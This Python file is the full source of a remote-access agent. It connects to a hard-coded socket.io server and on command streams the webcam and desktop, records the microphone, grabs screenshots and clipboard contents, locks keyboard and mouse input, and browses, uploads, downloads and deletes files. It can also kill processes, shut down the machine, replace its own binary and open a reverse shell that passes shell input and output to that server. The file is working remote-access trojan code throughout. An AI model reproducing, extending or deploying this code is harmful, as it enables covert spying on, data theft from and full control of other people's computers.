import socketio
import time
import uuid
import threading
import base64
import datetime
import psutil
import requests
import socket
import os
import subprocess
import shutil
from pathlib import Path
import sys
import tempfile
import pynput
import cv2
import mss
import numpy
import pyperclip
try:
    import sounddevice as sd
    from scipy.io.wavfile import write as write_wav
except ImportError:
    sd = None
    write_wav = None

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: pass
    class Style: pass
    Fore.GREEN = Fore.YELLOW = Fore.RED = Fore.CYAN = Fore.MAGENTA = ""
    Style.BRIGHT = Style.RESET_ALL = ""

class Logger:
    @staticmethod
    def _log(level, color, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{Style.BRIGHT}[{color}{level.upper()}{Style.RESET_ALL}] [{timestamp}] {message}")

    @staticmethod
    def info(message): Logger._log("info", Fore.GREEN, message)
    @staticmethod
    def warn(message): Logger._log("warn", Fore.YELLOW, message)
    @staticmethod
    def error(message): Logger._log("error", Fore.RED, message)
    @staticmethod
    def comms(message): Logger._log("comms", Fore.MAGENTA, message)

AGENT_ID = f"agent_{str(uuid.uuid4())[:8]}"
SERVER_URL = 'https://lumen.swirly.hackclub.app'
RECONNECT_DELAY = 5
STATS_INTERVAL = 3
FRAME_RATE = 15
FILE_CHUNK_SIZE = 1024 * 1024 

sio = socketio.Client()
stream_thread, stats_thread = None, None
stop_event = threading.Event()
ip_info_cache = {}
shell_process = None
shell_active = threading.Event()
input_lock_active = threading.Event()
file_uploads = {}
update_transfers = {}
IS_FROZEN = getattr(sys, 'frozen', False)
failed_connection_attempts = 0


def get_ip_info():
    global ip_info_cache
    if ip_info_cache: return ip_info_cache
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); local_ipv4 = s.getsockname()[0]; s.close()
        response = requests.get('http://ip-api.com/json', timeout=5).json()
        ip_info_cache = {"ipv4_local": local_ipv4, "ipv4_public": response.get('query'), "location": f"{response.get('city')}, {response.get('country')}"}
    except Exception: ip_info_cache = {"ipv4_local": "N/A", "ipv4_public": "N/A", "location": "N/A"}
    return ip_info_cache

def get_system_stats():
    uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
    battery = psutil.sensors_battery()
    status = "Input Locked" if input_lock_active.is_set() else "Shell Active" if shell_active.is_set() else "Online"
    return {
        **get_ip_info(), "cpu_usage": psutil.cpu_percent(), "ram_usage": psutil.virtual_memory().percent,
        "disk_usage": psutil.disk_usage('/').percent, "uptime": str(uptime).split('.')[0], 
        "battery": f"{battery.percent}% ({'Charging' if battery.power_plugged else 'Discharging'})" if battery else "N/A",
        "status": status
    }

def stats_update_loop():
    while not stop_event.is_set():
        try: sio.emit('agent_stats', {'agent_id': AGENT_ID, 'stats': get_system_stats()})
        except Exception as e: Logger.error(f"Stats loop error: {e}")
        stop_event.wait(STATS_INTERVAL)


@sio.event
def connect():
    global stats_thread, failed_connection_attempts
    Logger.info("Successfully connected to server.")
    failed_connection_attempts = 0 
    stop_event.clear()
    sio.emit('register_agent', {'id': AGENT_ID, 'stats': get_system_stats()})
    if not (stats_thread and stats_thread.is_alive()):
        stats_thread = threading.Thread(target=stats_update_loop, daemon=True); stats_thread.start()

@sio.event
def connect_error(data): Logger.error(f"Connection failed: {data}")

@sio.event
def disconnect(*args): 
    Logger.warn("Disconnected from server. Stopping threads.")
    stop_event.set()
    stop_reverse_shell()

@sio.on('command_to_agent')
def handle_command(data):
    command = data.get('command')
    
    Logger.comms(f"Received command: '{command}'")
    if command == 'start_webcam': start_streaming('webcam')
    elif command == 'start_desktop': start_streaming('desktop')
    elif command == 'stop_stream': stop_streaming()
    elif command == 'start_reverse_shell': start_reverse_shell()
    elif command == 'stop_reverse_shell': stop_reverse_shell()

def restart_script():
    Logger.warn("Executing script restart...")
    try:
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': 'Restarting script... Connection will be lost temporarily.'})
    except Exception:
        pass 
    if sio.connected:
        sio.disconnect()
    os.execv(sys.executable, [sys.executable] + sys.argv)


@sio.on('system_command_to_agent')
def handle_system_command(data):
    command = data.get('command')
    Logger.comms(f"Received system command: '{command}'")
    actions = {
        'get_processes': get_process_list,
        'get_clipboard': get_clipboard,
        'restart_script': restart_script,
        'kill_process': lambda: kill_process_handler(data),
        'lock_input': lambda: threading.Thread(target=timed_input_lock, args=(data.get('duration', '30'),), daemon=True).start(),
        'restart': lambda: os.system("shutdown /r /t 1"),
        'shutdown': lambda: os.system("shutdown /s /t 1"),
        'take_screenshot': take_screenshot,
        'record_audio': lambda: record_audio(data.get('duration', '10'))
    }
    if command in actions:
        actions[command]()

def kill_process_handler(data):
    pid = data.get('pid')
    _, message = kill_process(pid)
    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': message})
    get_process_list()

def get_process_list():
    procs = [p.info for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info'])]
    for p in procs: p['memory_mb'] = p['memory_info'].rss / (1024*1024)
    sio.emit('system_response_from_agent', {'agent_id': AGENT_ID, 'command': 'process_list', 'processes': procs})

def kill_process(pid):
    try: p = psutil.Process(pid); p.terminate(); return True, f"Terminated PID {pid} ({p.name()})."
    except Exception as e: return False, f"Error terminating PID {pid}: {e}"

def timed_input_lock(duration_str):
    if input_lock_active.is_set(): sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Input already locked."}); return
    if not pynput: sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Error: pynput not found."}); return
    try: duration = int(duration_str)
    except: sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Invalid lock duration."}); return
    
    input_lock_active.set()
    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Locking input for {duration}s."})
    ml = pynput.mouse.Listener(suppress=True); kl = pynput.keyboard.Listener(suppress=True)
    ml.start(); kl.start()
    time.sleep(duration)
    ml.stop(); kl.stop()
    input_lock_active.clear()
    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Input unlocked."})

def get_clipboard():
    if not pyperclip: sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Error: pyperclip not found."}); return
    try: content = pyperclip.paste()
    except Exception as e: content = f"Could not get clipboard: {e}"
    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Clipboard content:\n---\n{content}\n---"})


def take_screenshot():
    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': 'Taking screenshot...'})
    try:
        with mss.mss() as sct:
            sct_file = sct.shot(mon=-1, output=f"mss-{sct.monitors[0]['top']}_{sct.monitors[0]['left']}.png")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        new_filename = f"screenshot_{timestamp}.png"
        
        temp_dir = tempfile.gettempdir()
        temp_path = os.path.join(temp_dir, new_filename)
        
        shutil.move(sct_file, temp_path)
        
        Logger.info(f"Screenshot saved to {temp_path}, sending to server...")
        threading.Thread(target=send_file_to_server, args=(temp_path,), daemon=True).start()
    except Exception as e:
        Logger.error(f"Screenshot failed: {e}")
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Screenshot failed: {e}"})

def record_audio(duration_str):
    if not sd or not write_wav:
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Error: Audio libraries (sounddevice, scipy) not found."})
        return
    try: duration = int(duration_str)
    except: sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Invalid recording duration."}); return

    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f'Recording audio for {duration} seconds...'})
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"recording_{timestamp}.wav"
        temp_path = os.path.join(tempfile.gettempdir(), filename)

        write_wav(temp_path, fs, recording)
        Logger.info(f"Audio saved to {temp_path}, sending to server...")
        threading.Thread(target=send_file_to_server, args=(temp_path,), daemon=True).start()
    except Exception as e:
        Logger.error(f"Audio recording failed: {e}")
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Audio recording failed: {e}"})

@sio.on('update_binary_chunk_to_agent')
def handle_update_binary_chunk(data):
    global update_transfers
    transfer_id = data['transfer_id']

    if transfer_id not in update_transfers:
        if not IS_FROZEN:
            sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Update via binary only works for compiled agents. Aborting."})
            return
        try:
            temp_dir = tempfile.gettempdir()
            new_exe_path = os.path.join(temp_dir, f"agent_new_{transfer_id}.exe")
            update_transfers[transfer_id] = {"path": new_exe_path, "file": open(new_exe_path, 'wb')}
            sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Receiving agent update binary..."})
        except Exception as e:
            Logger.error(f"Agent update setup failed: {e}")
            sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Update setup failed: {e}"})
            return

    try:
        transfer = update_transfers[transfer_id]
        transfer['file'].write(data['chunk'])
        if data['final']:
            transfer['file'].close()
            sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Update binary received. Applying..."})
            apply_update(transfer['path'])
            del update_transfers[transfer_id]
    except Exception as e:
        Logger.error(f"Agent update failed during transfer: {e}")
        if transfer_id in update_transfers:
            if 'file' in update_transfers[transfer_id] and not update_transfers[transfer_id]['file'].closed:
                update_transfers[transfer_id]['file'].close()
            del update_transfers[transfer_id]

def apply_update(new_exe_path):
    exe_path = sys.executable
    pid = os.getpid()
    
    bat_script = f"""
@echo off
echo Updating agent binary...
echo Waiting for old process (PID: {pid}) to terminate...
timeout /t 4 /nobreak > NUL
echo Replacing executable...
move /Y "{new_exe_path}" "{exe_path}" > NUL
echo Starting new agent...
start "" "{exe_path}"
echo Cleaning up updater script...
del "%~f0"
"""
    updater_bat_path = os.path.join(tempfile.gettempdir(), f'updater_{pid}.bat')
    with open(updater_bat_path, 'w') as f: f.write(bat_script)
        
    sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': "Applying update. Connection will be lost."})
    subprocess.Popen(['cmd.exe', '/c', updater_bat_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP, close_fds=True)
    if sio.connected: sio.disconnect()
    sys.exit(0)


@sio.on('file_upload_chunk_to_agent')
def handle_file_upload_chunk(data):
    global file_uploads
    transfer_id = data['transfer_id']
    
    if transfer_id not in file_uploads:
        try:
            downloads_path = Path.home() / "Downloads"
            safe_filename = os.path.basename(data['filename'])
            filepath = downloads_path / safe_filename
            c = 1
            while filepath.exists():
                filepath = filepath.with_stem(f"{filepath.stem}_{c}"); c += 1
            file_uploads[transfer_id] = {"path": str(filepath), "file": open(str(filepath), 'wb')}
            sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Receiving file: {filepath.name}"})
        except Exception as e:
            Logger.error(f"File upload setup failed for {data.get('filename')}: {e}")
            if transfer_id in file_uploads:
                if 'file' in file_uploads[transfer_id] and not file_uploads[transfer_id]['file'].closed:
                    file_uploads[transfer_id]['file'].close()
                del file_uploads[transfer_id]
            return

    if transfer_id in file_uploads:
        try:
            upload = file_uploads[transfer_id]
            upload['file'].write(data['chunk'])
            if data['final']:
                upload['file'].close()
                sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"File upload complete: {os.path.basename(upload['path'])}"})
                del file_uploads[transfer_id]
        except Exception as e:
            Logger.error(f"File upload failed for {data.get('filename')}: {e}")
            upload = file_uploads[transfer_id]
            if 'file' in upload and not upload['file'].closed:
                upload['file'].close()
            del file_uploads[transfer_id]


def get_downloads_path(): return str(Path.home() / "Downloads")

@sio.on('fb_command_to_agent')
def handle_fb_command(data):
    command, path = data.get('command'), data.get('path')
    if command == 'get_initial_path':
        path = get_downloads_path()
        sio.emit('fb_response_from_agent', {'agent_id': AGENT_ID, 'command': 'path_contents', 'path': path, 'contents': list_directory(path)})
    elif command == 'list_dir':
        sio.emit('fb_response_from_agent', {'agent_id': AGENT_ID, 'command': 'path_contents', 'path': path, 'contents': list_directory(path)})
    elif command == 'delete_item':
        _, message = delete_item(path)
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': message})
        sio.emit('fb_response_from_agent', {'agent_id': AGENT_ID, 'command': 'path_contents', 'path': str(Path(path).parent), 'contents': list_directory(str(Path(path).parent))})
    elif command == 'download_file':
        threading.Thread(target=send_file_to_server, args=(path,), daemon=True).start()

def list_directory(path):
    try:
        return [{'name': i.name, 'type': 'dir' if i.is_dir() else 'file', 'size': i.stat().st_size if not i.is_dir() else 0} for i in os.scandir(path)]
    except Exception as e: return {'error': str(e)}

def delete_item(path):
    try:
        if os.path.isdir(path): shutil.rmtree(path)
        else: os.remove(path)
        return True, f"Deleted: {os.path.basename(path)}"
    except Exception as e: return False, f"Error deleting: {e}"

def send_file_to_server(path):
    try:
        if not os.path.exists(path) or not os.path.isfile(path):
            raise FileNotFoundError(f"File does not exist or is not a file: {path}")
        file_size = os.path.getsize(path)
        if file_size == 0:
            sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Cannot download empty file."}); return
        
        transfer_id, total_chunks = str(uuid.uuid4()), (file_size + FILE_CHUNK_SIZE - 1) // FILE_CHUNK_SIZE
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Uploading {os.path.basename(path)}..."})
        with open(path, 'rb') as f:
            for i in range(total_chunks):
                chunk = f.read(FILE_CHUNK_SIZE)
                sio.emit('fb_file_chunk_from_agent', {'agent_id': AGENT_ID, 'transfer_id': transfer_id, 'filename': os.path.basename(path), 'chunk': chunk, 'total_chunks': total_chunks, 'final': (i == total_chunks - 1)})
    except Exception as e:
        Logger.error(f"Could not read file for download: {e}")
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Could not read file for download. Error: {e}"})
    finally: 
        if tempfile.gettempdir() in str(path):
            try: os.remove(path)
            except OSError: pass


def stream_loop(source):
    stop_event.clear()
    cap = None
    try:
        if source == 'webcam':
            cap = cv2.VideoCapture(0)

            if not cap.isOpened():
                Logger.error("Webcam could not be opened.")
                sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': 'Error: Webcam could not be opened. Is it in use?'})
                return
        else:
            cap = mss.mss()
        
        monitor = cap.monitors[1] if source == 'desktop' else None
        
        while not stop_event.is_set():
            if source == 'webcam':
                ret, frame = cap.read()
                if not ret: break
            else:
                frame = cv2.cvtColor(numpy.array(cap.grab(monitor)), cv2.COLOR_BGRA2BGR)
            
            _, buffer = cv2.imencode('.jpg', cv2.resize(frame, (1280, 720)), [cv2.IMWRITE_JPEG_QUALITY, 70])
            sio.emit('video_stream_from_agent', {'agent_id': AGENT_ID, 'frame': base64.b64encode(buffer).decode('utf-8')})
            time.sleep(1/FRAME_RATE)
            
    except Exception as e:
        sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f'Streaming Error: {e}'})
    finally:
        if isinstance(cap, cv2.VideoCapture): cap.release()
        stop_event.clear()

def start_streaming(source):
    global stream_thread
    if stream_thread and stream_thread.is_alive(): return
    stop_event.clear(); stream_thread = threading.Thread(target=stream_loop, args=(source,), daemon=True); stream_thread.start()

def stop_streaming():
    if stream_thread and stream_thread.is_alive(): stop_event.set(); stream_thread.join(2)

def shell_reader(pipe, a_id):
    try:
        with pipe:
            for line in iter(pipe.readline, b''):
                sio.emit('shell_output_from_agent', {'agent_id': a_id, 'output': line.decode('utf-8', 'ignore').strip()})
    finally: shell_active.clear()

def start_reverse_shell():
    global shell_process
    if shell_active.is_set(): return
    shell_active.set()
    shell_process = subprocess.Popen('cmd.exe' if os.name == 'nt' else '/bin/bash', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    threading.Thread(target=shell_reader, args=[shell_process.stdout, AGENT_ID], daemon=True).start()
    threading.Thread(target=shell_reader, args=[shell_process.stderr, AGENT_ID], daemon=True).start()

def stop_reverse_shell():
    global shell_process 
    if shell_active.is_set():
        if shell_process:
            try:
                shell_process.terminate()
            except ProcessLookupError:
                pass 
            shell_process = None
        shell_active.clear()

@sio.on('shell_command_to_agent')
def handle_shell_command(data):
    if shell_process and shell_active.is_set():
        shell_process.stdin.write((data.get('command', '') + '\n').encode('utf-8')); shell_process.stdin.flush()

if __name__ == '__main__':
    Logger.info(f"Agent '{AGENT_ID}' starting... Frozen: {IS_FROZEN}")
    get_ip_info()
    max_failed_attempts = 4

    while True:
        try:
            Logger.info(f"Attempting to connect to {SERVER_URL}...")
            sio.connect(SERVER_URL, transports=['websocket'])
            sio.wait() 
        except socketio.exceptions.ConnectionError as e:
            failed_connection_attempts += 1
            Logger.error(f"Connection error: {e}. Failure {failed_connection_attempts}/{max_failed_attempts}.")
            if failed_connection_attempts >= max_failed_attempts:
                Logger.error("Max connection attempts reached. Restarting script.")
                restart_script()
        except KeyboardInterrupt:
            Logger.warn("\nAgent shutting down manually.")
            break
        except Exception as e:
            failed_connection_attempts += 1
            Logger.error(f"An unexpected error occurred in main loop: {e}. Failure {failed_connection_attempts}/{max_failed_attempts}.")
            if failed_connection_attempts >= max_failed_attempts:
                Logger.error("Max connection attempts reached after unexpected error. Restarting.")
                restart_script()
        
        if sio.connected:
            sio.disconnect()
        
        Logger.info(f"Retrying in {RECONNECT_DELAY} seconds...")
        time.sleep(RECONNECT_DELAY)